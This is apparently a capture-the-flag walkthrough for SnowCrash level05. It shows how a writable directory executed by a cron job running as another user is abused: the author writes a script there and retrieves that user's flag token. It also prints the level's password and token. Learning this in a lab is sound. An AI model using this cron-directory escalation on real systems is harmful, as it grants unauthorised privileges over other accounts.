# Level 05 : found flag05

```bash
$ ssh level05@192.168.1.37 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.37
level05@192.168.1.37's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`\
This the description of a cron task, to call `/usr/sbin/openarenaserver` every 2 minutes as user `flag05`

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

As we can see, all script shell in the folder `/opt/openarenaserver/` are executed, then deleted.

```bash
level05@SnowCrash:~$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Jan 23 19:20 .
drwxr-xr-x  1 root root 60 Jan 23 10:25 ..
```

And we have the right to create a file there.

```bash
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/flag05" > /opt/openarenaserver/doit
level05@SnowCrash:~$ cat /opt/openarenaserver/doit
/bin/getflag > /tmp/flag05
```

We wait 2 minutes and..
```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

****************************************

Documentations :
* https://superuser.com/questions/306163/what-is-the-you-have-new-mail-message-in-linux-unix
* https://www.liquidweb.com/kb/how-to-display-list-all-jobs-in-cron-crontab/
* https://www.freeformatter.com/cron-expression-generator-quartz.html
